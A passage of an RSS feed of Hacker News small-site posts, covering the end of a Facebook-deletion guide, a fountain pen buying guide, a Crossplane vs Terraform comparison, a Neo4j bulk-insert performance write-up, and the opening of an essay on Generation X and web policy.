<h2 id="3-unfriend-unlike-and-delete-all-photos">3: Unfriend, unlike, and delete all photos</h2>
<p>There are quite a few command line interfaces that can help you with this:</p>
<ul>
  <li><a href="https://github.com/spieglt/fb-delete">https://github.com/spieglt/fb-delete</a></li>
  <li><a href="https://github.com/weskerfoot/DeleteFB]">https://github.com/weskerfoot/DeleteFB</a></li>
</ul>

<p>Another strategy is to scramble the information before you delete your account, however this requires a fair bit more time and programming some custom scripts.</p>

<h2 id="4-announce-departure">4: Announce departure</h2>
<p>As a final step I suggest announcing to your network that you’re leaving the platform, leaving alternative contact details and requesting that others don’t upload photos of you.
The process should take a few days to complete on Facebook’s end, at which point your data is <em>supposedly</em> deleted from their servers.</p>

<p>Now enjoy being away from the platform - try to select for high value activities to do in your free time, and notice how you’ll focus more on your most meaningful and rewarding relationships.</p>

  </div>
</article>
 



      </div>
    </div></div>]]>
            </description>
            <link>https://www.santiagomartins.com/social-media/2021/03/06/how-to-delete-your-facebook-account-in-2021.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26370079</guid>
            <pubDate>Sat, 06 Mar 2021 20:03:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: PrograMaker – Visual Programming Platform]]>
            </title>
            <description>
<![CDATA[
Score 69 | Comments 14 (<a href="https://news.ycombinator.com/item?id=26369893">thread link</a>) | @kenkeiras
<br/>
March 6, 2021 | https://programaker.com/about | <a href="https://web.archive.org/web/*/https://programaker.com/about">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://programaker.com/about</link>
            <guid isPermaLink="false">hacker-news-small-sites-26369893</guid>
            <pubDate>Sat, 06 Mar 2021 19:38:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Choose An Everyday Fountain Pen]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26368951">thread link</a>) | @gennarro
<br/>
March 6, 2021 | https://unsharpen.com/everyday-fountain-pen/ | <a href="https://web.archive.org/web/*/https://unsharpen.com/everyday-fountain-pen/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><small>Unsharpen may earn a commission when you buy through links on our site.</small></p><div>

                                
                                <p>Many people see fountain pens as occasional writing instruments, maybe for doing some journaling or writing a letter, but that doesn’t have to be the case. The right fountain pen can be a great everyday tool, even if it never approaches the tool-like functionality of a ballpoint pen.</p>

<h2><span id="What_To_Look_For_In_An_Everyday_Fountain_Pen">What To Look For In An Everyday Fountain Pen</span></h2>
<p>An everyday pen is going to vary widely based on what your everyday looks like. For many of us this means sitting at a desk and looking at a computer screen, which means that our pen needs to be comfortable, functional (without being utilitarian), and ready to go at all times.</p>
<p>For others, an everyday fountain pen might require some sort of for transportation friendliness and perhaps some degree of toughness, which veers off from the “everyday fountain pen” to the “everyday carry fountain pen.” While a perfectly valid use case, we’ll differentiate between pens that need to go with you and pens that are simply going to see a lot of use each and every day.</p>

<p>The attributes you’ll want sort through for this “workhorse” pen are…</p>
<ol><li>Reliability</li>
<li>Ease of Use (cap type, etc.)</li>
<li>Ease of Maintenance</li>
<li>Price</li>
</ol><p>I put these in order based on the impact each will have on your use of the pen and how long it lasts as your everyday writer.</p>
<p><strong>Reliability</strong> is key because the pen has to be ready to go when you want to use it. If you are on a Zoom and you need to write something down, your pen has to be at-the-ready. If your fountain pen can’t accomplish this, you simply won’t use it all the time and will revert to the ballpoint next to it on your desk.</p>
<p>Next comes <strong>ease of use</strong>, which means the pen has to be simple and trouble-free for you and your work style. This may mean that you opt for a pen that uses cartridges and has a snap-on cap instead of a screw-on one, because both of these things make pens easier to operate. This isn’t about what’s coolest or most desirable, but rather <em>removing the factors that hinder you from using a fountain pen</em>.</p>
<p>Much of the ease of use will come from the sensitivity of the nib and the choice of a filling system. First of all, it’s critical that you find your pen’s nib to be comfortable but not overall sensitive. If every time you want to dash off a thought you are worried about about holding the pen at exactly the right angle and the nib in its perfect “sweet spot” your work will be hindered.</p>
<p><strong>Ease of maintenance</strong> might be seen as an extension of ease of use, but for people who use their fountain pen as a primary writing tool, it’s worth distinguishing between the two. A pen that is easy to maintain will have old ink cleaned out quickly, featuring a feed that lets go of ink freely. The pen will be free of sensitive parts and most parts will be easy to cheap to replace, as well as user serviceable.</p>
<p>Any talk of <strong>price</strong> must be done relative to one’s own price sensitivity as well as your budget. If you are a professional scribe (not exactly a popular choice these days) or a calligrapher, an everyday pen might be one of your most expensive purchases. For most of us, an everyday pen shouldn’t be too expensive, because it’s something we want to use, not to baby, and you won’t mind then it takes a few inevitable bumps.</p>
<p>A good price range for an everyday pen would be $20 to $180, but this is only a loose guideline. Some people are less price sensitive and will be more inclined to use the pen — that is to say, to work — with a more expensive one, but be careful with this logic as the need to use a new purchase to justify its cost will wear aware quickly.</p>
<h3><span id="A_Note_On_Affordable_Pens">A Note On Affordable Pens</span></h3>
<p>While many excellent pens are sold under the $20 price point, they don’t have the same level of fit and polish of more expensive pens. The will also not last as long as pens that are a step up in price, so you’ll find small problems accruing, like loose caps and bent clips. This is why this list doesn’t have otherwise solid pens like the <a href="https://unsharpen.com/pen/platinum-prefounte/">Platinum Prefounte</a>&nbsp;— they just won’t go the distance of these workhorse pens.</p>
<h2><span id="Top_Choices_For_Everyday_Fountain_Pens">Top Choices For Everyday Fountain Pens</span></h2>
<p>Here are some pens that make for excellent everyday usage over extended period of time.</p>
<ul><li><strong><a href="https://unsharpen.com/pen/lamy-safari-fountain-pen/">Lamy Safari</a></strong>: Affordable and highly usable, this will be the pen that comes to mind for many people. When combined with Lamy’s excellent cartridges its one of the most practical fountain pens sold today. The <a href="https://unsharpen.com/pen/lamy-vista-fountain-pen/">Vista</a> is just as good.</li>
<li><a href="https://unsharpen.com/pen/twsbi-eco-fountain-pen/"><strong>Twsbi Eco</strong></a>: This is a $30 pen that writes and has the features of a pen that’s easily twice the price. It’s highly rebuildable and pleasant both use and to maintain.</li>
<li><a href="https://unsharpen.com/pen/penbbs-456-fountain-pen/"><strong>Penbbs 456</strong></a>: A large, good-looking pen with a vacuum-filling mechanism that means it carries a lot of ink. The nib is surprisingly good and while it looks underwhelming is writes smoothly and reliably.</li>
<li><a href="https://unsharpen.com/pen/platinum-procyon/"><strong>Platinum Procyon</strong></a>: This is a pen that doesn’t get as much attention as it should. It has a stout metal body, a responsive steel nib, and a handsome design. It also has all the smart design decisions found in Platinum’s modern fountain pens, like a nib that basically never seems to try out and use of Platinum’s very good cartridges.</li>
<li><a href="https://amzn.to/2ZlLIip" target="_blank" rel="nofollow noopener noreferrer"><strong>Lamy Studio</strong></a>: Lamy’s best mid-range fountain pen. It has more weigh than the Safari but is a good deal more affordable than the 2000. It’s a really solid choice in a sub-$100 metal fountain pen.</li>
<li><a href="https://unsharpen.com/pen/platinum-3776-century-fountain-pen/"><strong>Platinum 3776 Century</strong></a>: Unsharpen’s favorite fountain pen under $200, this pen writes like a dream and has a simple, reliable cartridge/converter system. The cap works great and it seals so well that the pen is always ready to write.</li>
<li><strong><a href="https://unsharpen.com/pen/pilot-custom-74-fountain-pen/">Pilot Custom 74</a></strong>: If you want a super smooth writer that has a lot of polish as well as a classic fountain pen look than the Custom 74 is a popular pick.</li>
<li><a href="https://unsharpen.com/pen/lamy-2000-fountain-pen/"><strong>Lamy 2000</strong></a>: This is another excellent gold nib fountain pen that is designed to last for year of writing. It’s not quite as easy to service as the rest of the pens on the list, but it is rebuildable. You get a fantastic nib and a body that shows natural wear after use, so you can really feel this pen changing over time and becoming yours.</li>
</ul><h2><span id="Pens_That_Didnt_Make_It">Pens That Didn’t Make It</span></h2>
<p>Here are some pens you might have thought would be on the list, but aren’t along with the reason they didn’t make it.</p>
<ul><li><a href="https://unsharpen.com/pen/pilot-metropolitan/"><strong>Pilot Metropolitan</strong></a>: A good pen, but lacking in the polish of the pens on the list. Also the nib is less enjoyable and too utilitarian to be a pen that you look forward to using for years on end.</li>
<li><strong><a href="https://unsharpen.com/pen/pilot-vanishing-point/">Pilot Vanishing Point</a></strong>: Despite being a very popular pen, we’ve found the nib to be too finicky for everyday use and the likelihood of ink spitting. The pen is a bit complex on the inside too means it requires more care than any of the pens on the list.</li>
<li><a href="https://unsharpen.com/pen/kaweco-classic-sport-fountain-pen/"><strong>Kaweco Sport</strong></a>: A fine mini-pen but it’s a bit small and the undersized nib isn’t quite at the quality level of the others on this list. This pen is quite close to making it though.</li>
</ul><!-- AI CONTENT END 2 -->

                            </div></div>]]>
            </description>
            <link>https://unsharpen.com/everyday-fountain-pen/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26368951</guid>
            <pubDate>Sat, 06 Mar 2021 17:30:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Crossplane vs. Terraform]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26368766">thread link</a>) | @bassamtabbara
<br/>
March 6, 2021 | https://blog.crossplane.io/crossplane-vs-terraform/ | <a href="https://web.archive.org/web/*/https://blog.crossplane.io/crossplane-vs-terraform/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>Crossplane is often compared to HashiCorp’s Terraform. It’s common for enterprise platform teams to find Crossplane as they outgrow Terraform and look for alternatives. There are parallels between the two projects:</p><ul><li>Both allow engineers to model their infrastructure as declarative configuration</li><li>Both support managing a myriad of diverse infrastructure using "provider" plugins</li><li>Both are open source tools with strong communities</li></ul><p>The key difference is that Crossplane is a control plane, where Terraform is a command-line tool - an interface to control planes. This post touches on a handful of pain points that enterprises commonly face as they scale Terraform, and highlights how Crossplane addresses these&nbsp;issues.</p><h2 id="collaboration">Collaboration</h2><p>Enterprises often adopt Terraform via their operations team. It’s a great way for a small team of engineers to begin to wrangle their organisation’s infrastructure. Representing infrastructure as declarative configuration allows an operations team to benefit from software engineering best practices - keeping the configuration in revision control where changes can be peer reviewed and reverted when necessary.</p><figure><img src="https://blog.crossplane.io/content/images/2021/03/Cone@0.25x.png"></figure><p>Where Terraform can fall apart is when more engineers need to collaborate to manage their organisation’s infrastructure. Terraform relies on a monolithic state file to map desired configuration to actual, running infrastructure. A lock must be held on this state file while configuration is being applied, and applying a Terraform configuration is a blocking process that can take minutes to complete. During this time no other entity - no other engineer - can apply changes to the configuration. Similarly, Terraform uses a monolithic ‘apply’ process - there’s no recommended way to modify only one piece of infrastructure within a configuration. If you use the same configuration to manage your caches and your databases you must always update both - you can’t update only your caches.</p><p>Terraform recommends breaking a monolithic configuration up into increasingly more granular configurations. So while the operations team might start with a Terraform configuration that represents ‘production’, they’re encouraged to factor that out into scoped configurations like ‘production billing’ and ‘production auth’. It’s hard to get this right up front, so it can require <em>a lot</em> of refactoring over time, and often results in a complex mesh of Terraform configurations coupled by their inputs and outputs.</p><p>Collaboration scales in Crossplane because the Crossplane Resource Model (XRM) promotes loose coupling and eventual consistency. In Crossplane every piece of infrastructure is an API endpoint that supports create, read, update, and delete operations. Crossplane does not need to calculate a graph of dependencies to make a change, so you can easily operate on a single database, even if you manage your entire production environment with Crossplane.</p><h2 id="self-service">Self Service</h2><p>Modern organisations are evolving from centralised management of infrastructure to a self service model in which an operations team - often called a platform team - defines opinionated infrastructure abstractions that the development teams they support can consume on demand. Terraform has evolved to support this model through the use of <em>modules</em>. A module is not unlike a software library. Like Crossplane, Terraform resources are high-fidelity representations of an external API resource. A module provides a simplified abstraction atop a broader configuration of these resources - for example <a href="https://registry.terraform.io/modules/terraform-aws-modules/rds/aws/latest">the RDS module</a> abstracts eight distinct Terraform resources into a single “RDS instance” concept.</p><p>Treating application teams as consumers of a “library” of Terraform configuration means they are subject to Terraform’s collaboration constraints. Application developers are invited to collaborate on their organisation’s infrastructure as if they were an operations team with a narrower focus. The platform team invites application development teams to share their workflow, rather than offering them a service. This means application teams must learn a new, special purpose toolset and language - Terraform and the HashiCorp Configuration Language (HCL). It also raises the level of <em>configuration abstraction</em> for application developers without raising the level of <em>access control abstraction</em>. While the platform team can publish a module that allows an application team to manage “RDS instances”, access control remains down at the cloud provider API level and is thus framed around “database subnet groups” and “database parameter groups”.</p><figure><img src="https://blog.crossplane.io/content/images/2021/03/MulticloudCrane@0.5x-2.png"></figure><p>The Crossplane equivalent of a Terraform module is a Composite Resource - an XR. Each XR is exposed as an API endpoint. A platform team can define and document the OpenAPI schema of each XR - each API - and enforce Role Based Access Control (RBAC) at the API level. This means that if a platform team decides to frame the abstraction they offer to their development teams as “an AcmeCo PostgreSQL database” they can grant RBAC access to create, read, update, or delete an AcmeCo PostgreSQL database, rather than having to manage access to various underlying cloud concepts like RDS instances or subnet groups. Because Crossplane builds on the battle hardened Kubernetes RBAC system a platform team can easily support many teams of application developers within a single control plane. Each team can be granted access only to the abstractions they need - some might be able to manage only storage buckets, while others may be allowed to manage caches and databases.</p><p>Self service scales even further in Crossplane because any one XR may offer several classes of service. Crossplane decouples an XR’s inputs and outputs - its spec and status in Kubernetes parlance - from its implementation, which is described by a Composition. If an application developer has been granted access to create AcmeCo PostgreSQL databases, they may easily select from any of the classes of service - any of the Compositions - their platform team has declared to be compatible with said databases. These classes of service could represent production, staging, and development; AWS, Azure, and GCP; fast and slow; or any combination thereof.</p><h2 id="integration-and-automation">Integration and Automation</h2><p>Terraform sits in front of many APIs, but it does not offer its own. This leads many teams automate it by committing their Terraform configuration(s) to revision control - git - and executing Terraform as part of their CI/CD pipeline. This is an improvement relative to a team running Terraform from their laptops, but it exposes a key issue that organisations face when attempting to scale their use of Terraform. Terraform is a command line tool - not a control plane. Because it is a short lived, one-shot process it will only attempt to reconcile your desired configuration with actual infrastructure when it is invoked. Whether run from a CI/CD pipeline or a laptop Terraform is typically invoked only when an engineer <em>expects</em> that infrastructure needs updating.</p><p>Terraform’s conservative, ‘on-demand’ approach to reconciling desired with actual infrastructure state can lead to a novel deadlock. Recall that the process of applying a Terraform configuration is all-or-nothing - if you describe your caches and your databases in the same configuration you must always update both to update either. This means that if anyone in your organisation circumvents Terraform the next person to trigger a Terraform run will be faced with a surprising plan as it attempts to undo the change. Consider for example a scenario in which an engineer is paged in the middle of the night to handle an incident, makes some quick edits to the production cache configuration via the AWS console, and forgets to reflect those changes in Terraform. It’s not unheard of for infrastructure to drift so much that applying a Terraform configuration becomes a risky, intimidating proposition.</p><p>Crossplane, on the other hand, is built as a series of long lived, always-on control loops. It constantly observes and corrects an organisation’s infrastructure to match its desired configuration whether changes are expected or not. This disincentivizes teams from circumventing Crossplane. When Crossplane has been asked to manage a piece of infrastructure any change made outside it will automatically and persistently be reverted.</p><figure><img src="https://blog.crossplane.io/content/images/2021/03/Simple-Terraform-Stack.svg"></figure><p>A continued theme among the pain points organisations face with Terraform is that it does not offer an API. Integrating with Terraform is challenging because it is configured using a Domain Specific Language (DSL) - HCL - and invoked by calling a command line tool. Crossplane exposes a REST API - the lingua franca of automation. Whether a team writes mostly shell scripts, mostly Python, or mostly Erlang common patterns and libraries will exist for integrating with REST APIs and thus for integrating with Crossplane.</p><figure><img src="https://blog.crossplane.io/content/images/2021/03/Simple-Crossplane-Stack.svg"></figure><p>Crossplane doesn’t expose any old REST API. Building on the Kubernetes API means that teams can orchestrate all of their infrastructure - cloud and otherwise - using tools like kubectl. The same tools they use to orchestrate their containerised applications. Crossplane can even expose the details an application needs to connect to infrastructure as a Kubernetes secret to ease integration. It can be paired with projects like ArgoCD, Gatekeeper, or Velero to enable GitOps, advanced policy, and backups. Need bespoke automation? Leverage one of many well documented frameworks to build your own Kubernetes operator that integrates with Crossplane.</p><h2 id="why-not-both">Why Not Both?</h2><p>Crossplane and Terraform can both orchestrate an organisation’s infrastructure. There are similarities between the two, but each project approaches orchestration differently. Terraform offers a command-line interface to control plane APIs, while Crossplane is <em>itself</em> a control plane that can be used to build abstractions atop other control planes. Because Crossplane enables a platform team to offer their own control plane it avoids many of the challenges platform teams face when scaling Terraform.</p><figure><img src="https://blog.crossplane.io/content/images/2021/03/Simple-Crossplane-Stack-with-Terraform.svg"></figure><p>Savvy readers might notice …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.crossplane.io/crossplane-vs-terraform/">https://blog.crossplane.io/crossplane-vs-terraform/</a></em></p>]]>
            </description>
            <link>https://blog.crossplane.io/crossplane-vs-terraform/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26368766</guid>
            <pubDate>Sat, 06 Mar 2021 17:05:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Neo4j performance adventures for petabyte-scale datasets]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26368408">thread link</a>) | @azhenley
<br/>
March 6, 2021 | https://unhexium.net/research/neo4j-performance-adventures-for-petabyte-scale-datasets/ | <a href="https://web.archive.org/web/*/https://unhexium.net/research/neo4j-performance-adventures-for-petabyte-scale-datasets/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    <div>
      <p>I recently proposed a new research project idea: let’s take all of GitHub (or &lt;insert your preferred VCS host&gt;) and create a multi-language (even partially language-agnostic) concrete syntax tree of all the code so that we can do some otherwise impossibly difficult further research and answer incredibly complex questions.</p>

<p>This project is named <a href="https://github.com/utk-se/WorldSyntaxTree">World Syntax Tree</a>, or WST in short.</p>

<p>Originally I started the project using MongoDB and storing references between nodes as <code>ObjectID</code>s, but I quickly realized that a tabular format was not performant enough to be able to effectively represent a true tree.</p>

<p>So instead I switched over the whole project to the first and foremost graph database I came across: Neo4j.</p>

<p>As I quickly learned the new database paradigm I also quickly learned that there are a lot of problems between me and inserting literally hundreds of terabytes of data into a single graph…</p>



<p>The very first designs used <a href="https://github.com/neo4j-contrib/neomodel">neomodel</a> to control the layout and define the graph connections, and in fact <a href="https://github.com/utk-se/WorldSyntaxTree/blob/06c58a8ce5e06e3150334e454aeee89ae4a6bbb1/wsyntree/tree_models.py">we still use neomodel</a> for the less performance-sensitive parts of the collection process.</p>

<p>After running with neomodel for a fairly long time it was obvious it was far too much overhead when I inspected the collector process with <code>cProfile</code> and <a href="https://jiffyclub.github.io/snakeviz/">snakeviz</a>.</p>

<p>Using neomodel there were more than twice as many required queries for simply inserting one syntax node (<code>WSTNode</code>), extra checks like Cardinality and multiple statements just to set properties on newly created nodes were quite slow: at best I found I could insert a few hundred nodes per second using 128 processes.</p>



<p>From just the first few google results it was clear that writing my own raw cypher queries was the next move in order to better control exactly what operations needed to happen.</p>

<figure>
  
  <a href="https://unhexium.net/images/2021-03-04/n1.png"><img src="https://unhexium.net/images/2021-03-04/n1.png" alt="Profiler view: Majority of runtime stuck inside neomodel's checks"></a>
  
  <figcaption>Profiler view: Majority of runtime stuck inside neomodel's checks</figcaption>
</figure>

<p>The next PR that came from these efforts reworked the WSTNode creation routine into a series of functions that each did a distinct task: <a href="https://github.com/utk-se/WorldSyntaxTree/blob/c8d3f9f2c04f231dd93b4504b72a3f4da097edcf/wsyntree_collector/neo4j_collector_worker.py#L31-L91">create the node, connect the node, add the node text, connect the node text,</a> etc.</p>

<p>This did improve compared to using neomodel, but now the major bottleneck was really waiting on the network socket.</p>

<figure>
  
  <a href="https://unhexium.net/images/2021-03-04/n2.png"><img src="https://unhexium.net/images/2021-03-04/n2.png" alt="Profiler view: Reduced total runtime and approximately even split between each function call"></a>
  
  <figcaption>Profiler view: Reduced total runtime and approximately even split between each function call</figcaption>
</figure>

<blockquote>
  <p>Each of those 5 blocks corresponds to one of the 5 functions used during insertion of a WSTNode, noticing how they were all approximately the same size led me onto my next improvement…</p>
</blockquote>



<p>Once I saw how long each query took to initialize a connection and read back the results I figured I should reduce the total number of queries, which was quite easy really.</p>

<p>Instead of creating a node, returning the ID, running a new query to connect using that ID… just rewriting the create query to connect the new node as well meant an entire query less to execute!</p>

<p>So now that we <a href="https://github.com/utk-se/WorldSyntaxTree/blob/ea9dcc968e83534318a049268ca5c674b7ae6d1c/wsyntree_collector/neo4j_collector_worker.py#L31-L107">reduced the number of calls made per node by more than half</a> we saw a reasonable improvement, but we’re still only talking about a few hundred nodes per second even with more than a 100 workers.</p>



<p>Now we’re at the difficult part of the problem. Because we’re inserting a collection of nodes that refer to each other, we can’t iterate them all in parallel, otherwise some nodes might not have their parent node written to the database yet.</p>

<p>So in order to do this I needed to add another property to the WSTNode structure: <code>preorder</code>. This property was unique for nodes within a file and is calculated before we insert the WSTNode into the database, meaning we can use this property to refer to nodes before they are given a node ID by neo4j.</p>

<p>Once we have a way to refer to nodes uniquely within the file we can batch together large numbers of node insertions by using the super-magical <code>UNWIND</code> cypher statement. Essentially this allows us to pass a huge query parameter (like 10,000 node’s worth of properties in a list) and <a href="https://github.com/utk-se/WorldSyntaxTree/blob/06c58a8ce5e06e3150334e454aeee89ae4a6bbb1/wsyntree_collector/neo4j_collector_worker.py#L71-L86">execute a single query to create those 10,000 nodes</a>.</p>



<p>If any experienced Neo4j user has followed along so far, they might have already realized that the <code>preorder</code> property on my WSTNodes is not unique within the graph, so even though <a href="https://github.com/utk-se/WorldSyntaxTree/blob/06c58a8ce5e06e3150334e454aeee89ae4a6bbb1/wsyntree/tree_models.py#L65">we do have an index on that property</a>, when your graph grows to terabytes in size, you will have far too many nodes with the same <code>preorder</code> to efficiently search them all to find the one that has a relationship to the same <code>WSTFile</code> node we’re working in.</p>

<p>Because of <a href="https://github.com/utk-se/WorldSyntaxTree/blob/06c58a8ce5e06e3150334e454aeee89ae4a6bbb1/wsyntree_collector/neo4j_collector_worker.py#L75">this single extra condition inside the WHERE clause</a> the Neo4j database regularly would pin all 128 hardware threads of our lab server just searching through <code>WSTNode</code>s with the same <code>preorder</code> just to find the one that has a relationship to our <code>WSTFile</code>.</p>

<p>So instead I needed a way to refer to the nodes I just created with a constant-time lookup. I spent a whole day just thinking about how to overcome this problem, and finally ended up just accepting the fact that it would be faster to just execute two queries rather than continue banging my head against cypher syntax quirks.</p>

<p>After the first query I use the returned created node IDs to do the constant-time relationship creation in the second query. There might be some way to create relationships based on results from an <code>UNWIND</code>, but as long as we’ve got constant-time inserts on the db side I am happy.</p>

<p>And it was indeed faster:</p>

<figure>
  
  <a href="https://unhexium.net/images/2021-03-04/nn3.png"><img src="https://unhexium.net/images/2021-03-04/nn3.png" alt="Snakeviz of single-file run"></a>
  
  <figcaption>Snakeviz of single-file run</figcaption>
</figure>

<p>How’s that for performance improvement? We went from 330 seconds to under 3! Of course, 330 seconds for a single file was kind of absurd in the first place.</p>

<figure>
  
  <a href="https://unhexium.net/images/2021-03-04/vroom.png"><img src="https://unhexium.net/images/2021-03-04/vroom.png" alt="Terminal progress view via tqdm: inserting over 100k WSTNodes per second via 128 processes"></a>
  
  <figcaption>Terminal progress view via tqdm: inserting over 100k WSTNodes per second via 128 processes</figcaption>
</figure>

<p>Now that my program was blazing fast, Neo4j has trouble keeping up:</p>



<p>These are problems I encountered outside the scope of my own program.</p>

<h2 id="too-many-transactions-in-memory">Too many transactions in memory</h2>

<figure>
  
  <a href="https://unhexium.net/images/2021-03-04/oops.png"><img src="https://unhexium.net/images/2021-03-04/oops.png" alt="Watching our 512GB of RAM get used and Neo4j gets OOM'd"></a>
  
  <figcaption>Watching our 512GB of RAM get used and Neo4j gets OOM'd</figcaption>
</figure>

<p>My initial guess for large batch sizes was around 10,000 nodes per query, however when we multiply that by 128 (processes running in parallel) and a conservative estimate for RAM usage, we’re looking at trying to processes transactions in memory at multiple gigabytes per second.</p>

<p>The solution to this was to manually set the memory settings in <code>neo4j.conf</code>, since I have a fairly large system dedicated to research work I could steal quite a bit of memory:</p>

<div><div><pre><code><span># Settings from memrec had to be changed a bit vs what was recommended:
# I need at least 128G left over for my own code to run on the same system
</span><span>dbms</span>.<span>memory</span>.<span>heap</span>.<span>initial_size</span>=<span>31</span><span>g</span>
<span>dbms</span>.<span>memory</span>.<span>heap</span>.<span>max_size</span>=<span>128</span><span>g</span>
<span>dbms</span>.<span>memory</span>.<span>pagecache</span>.<span>size</span>=<span>259500</span><span>m</span>

<span># It is also recommended turning out-of-memory errors into full crashes,
# instead of allowing a partially crashed database to continue running:
</span><span>dbms</span>.<span>jvm</span>.<span>additional</span>=-<span>XX</span>:+<span>ExitOnOutOfMemoryError</span>
</code></pre></div></div>

<h2 id="database-not-up-to-the-requested-version">Database not up to the requested version</h2>

<div><div><pre><code>neo4j.exceptions.TransientError: {code: Neo.TransientError.Transaction.BookmarkTimeout} {message: Database 'top1k' not up to the requested version: 113071. Latest database version is 113054}
</code></pre></div></div>

<p>This is a tricky one, I still haven’t fully pinned down the exact conditions for this to happen, but it boils down to the database not applying the transactions in a timely manner, meaning the current “live version” could be more than a few transactions out of date. (With my scale of data it ranged from 5-20 versions out of date.)</p>

<p>The best solution I could come up for this problem was to only run half as many worker processes, my guess is that the database was having trouble handling 128 consecutive transactions at a time.</p>

<p>I’d like to know why exactly this happens, and if possible I would much rather prefer the query to stall until the requested version is met (or error the original query if that version can’t be reached) rather than fail a query later on.</p>

<p>If you happen to know something about why or how this happens, please leave a comment, email me, or even <a href="https://github.com/utk-se/WorldSyntaxTree">open an issue on our project</a>!</p>

<h3 id="a-persistent-problem">A persistent problem</h3>

<p>I thought if I reduced the load on the database significantly it would have no problem keeping up, so I brought the batch size down to just 100 and ran only 8 processes, and yet we still arrive at the same problem:</p>

<blockquote>
  <p>Database ‘top1k’ not up to the requested version: 2282021. Latest database version is 2282020</p>
</blockquote>

<p>Why is my database stuck in 2020 you ask? Not a clue, so this is really where the adventure begins.</p>

<p>Over the few days since initial release of this post, I have been trying nothing but to get to the bottom of why this is occuring, I have carefully picked through both the neo4j <code>debug.log</code> and <code>query.log</code> and nothing really stood out as a problem.</p>

<p>One thing notable about these errors is they always seem to happen after passing around ~250GB of data stored. The most I could store before being stopped by this error was ~319GB (uncompressed) in the neo4j data directory. There are only ~500 million nodes and ~1.7 billion relationships at this point, meaning the average inserted node was well under a kilobyte, all within reason.</p>

<p>I can definitively confirm that there’s no problem with the hardware, the data directory is stored on a RAIDZ (zfs) array of all SSD storage, and I’ve confirmed that I/O time is not the bottleneck, and there are over 50 unused CPU cores to spare.</p>

<p>So my thoughts now are that the insert time for these nodes might not actually be constant as I thought, otherwise we’d see the same behavior between millions of nodes and just a few thousand. Perhaps there’s nonlinear work being done in some of the indexes? Maybe the data is too large to be indexed fully? There are a number of reasons to test, so finding the real cause will take quite a bit of time.</p>

      
    </div><!-- /.entry-content -->
  </article></div>]]>
            </description>
            <link>https://unhexium.net/research/neo4j-performance-adventures-for-petabyte-scale-datasets/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26368408</guid>
            <pubDate>Sat, 06 Mar 2021 16:22:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Generation X will save the web]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26368323">thread link</a>) | @hacksilver
<br/>
March 6, 2021 | https://webdevlaw.uk/2021/01/30/why-generation-x-will-save-the-web/ | <a href="https://web.archive.org/web/*/https://webdevlaw.uk/2021/01/30/why-generation-x-will-save-the-web/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p>I like to make things as difficult for myself as possible, so first, I decided to become an independent-minded female immigrant in a parochial and patriarchal nation; then, when that got boring, I decided to become a woman in tech, where I found myself giving conference talks to rooms of professionals who could, technically and biologically, be my grown adult children.</p>

<p><span>T</span>hen, when that got boring, I pivoted out of code tech to policy tech, where I now find myself in much more forgiving company. Which is to say, for the first time since my non-tech career, I work alongside and in partnership with other Gen Xers.</p>
<p><em>Insert any number of Buzzfeed listicles here about what it’s like to be a GenXer in tech: we learned on floppies and dialup; we coded out of print magazines; we sowed our teenage wild oats on the parental tether of nothing more than a coin in a pay phone; we lived entire years of our student lives without a single photograph being taken of us; we navigated 9/11 on dumb cell phones which had antennas; we now live datafied existences, raising datafied children attending datafied virtual schools, in a world where everything we were raised to believe would sort us for life turned out to be boomer bullshit.</em></p>
<p>All of those formative experiences give us (cough) fortysomethings a perspective on the internet which the boomers who birthed us lack, and which the millenials who followed us will never know.</p>
<p>In fact, we’ve gotten a lot of mileage out of the trope of the internet being threatened by elderly politicians who don’t understand it, or us. And that trope, for the most part, is as true as it ever was.</p>
<p>I can count on one hand the number of boomer-aged Parliamentarians in my network who well and truly understand the internet and its culture. They’re good folks who have my time, anytime. The rest, sadly, have more in common with the editorial board of the now-unreadable Glasgow broadsheet which issues weekly diatribes against the internet and all those who sail in her: every word steeped in all the offended sense of entitlement that bitter old men can muster, every rant beating the same dead horse against an internet which took away the newspaper readership that should, in their opinions, be hanging on every word that comes out of their privileged white Scottish male mouths.</p>
<p>So goes it for lawmakers, who – by nature and by privilege – have been insulated from the social and economic changes which necessitated the shift from the web as a geek hobby to the web as democratised culture. The ones who legislate aginst the web as if trying to restore an old world which existed before it, a world which only ever benefited people who looked and sounded like them.</p>
<p>Those lawmakers were who I expected to spend most of my time dealing with after my full-time pivot to policy.</p>
<p>The reality has been a lot more mind-blowing to comprehend than that.</p>
<p>Brace yourself.</p>
<p>When I was in my early twenties, in the late 90s and early 00s, running work missions across downtown Washington DC – pop into the Capitol complex here, run a folder to the White House there, drop off something for the Secretary of State on a long lunch break – everyone I encountered looked like me. The same age, the same countenance, the same Scully red hair (hey, it worked on me). Government may have been directed by professional politicians, but its actual daily mechanics were run by kids just out of university who had all the energy in the world and nothing and no one holding them down.</p>
